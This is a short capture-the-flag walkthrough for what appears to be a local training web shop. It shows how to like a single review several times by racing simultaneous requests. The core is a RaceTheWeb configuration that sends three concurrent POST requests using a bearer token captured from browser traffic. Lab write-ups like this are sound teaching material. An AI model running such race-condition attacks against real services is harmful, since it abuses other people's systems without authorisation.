## Multiple Likes
### Challenge: Like any review at least three times as the same user.

1. Log in as any user.
2. Like any review.
3. Replay the same request to get a `403 Forbidden` HTTP response.
4. Write a script that simultaneously executes three requests to the same review.
    - The following configuration file will work with RaceTheWeb:
    ```
    # Multiple Likes
    # Save this as multiple-likes.toml
    # Get comment information from this endpoint first: http://localhost:3000/rest/products/<id>/reviews
    # Then repalce id values in body parameter of this file
    # You need to replace the bearer token as well
    # open browser dev tools, like any of the comment, then inspect the traffic to obtain a valid bearer token
    # Launch this file by doing ./racethweb multiple-likes.toml
    count = 3
    verbose = true
    [[requests]]
        method = "POST"
        url = "http://localhost:3000/rest/products/reviews"
        body = "{\"id\":\"QEBb8RKLor69dsXkB\"}"
        headers = ["Content-Type: application/json","Authorization: Bearer XXX"]
    ```
5. Run your script to solve this challenge.
    - Asychronous handling of web requests executed simultaneously will trigger a race condition that will allow all requests to get through.
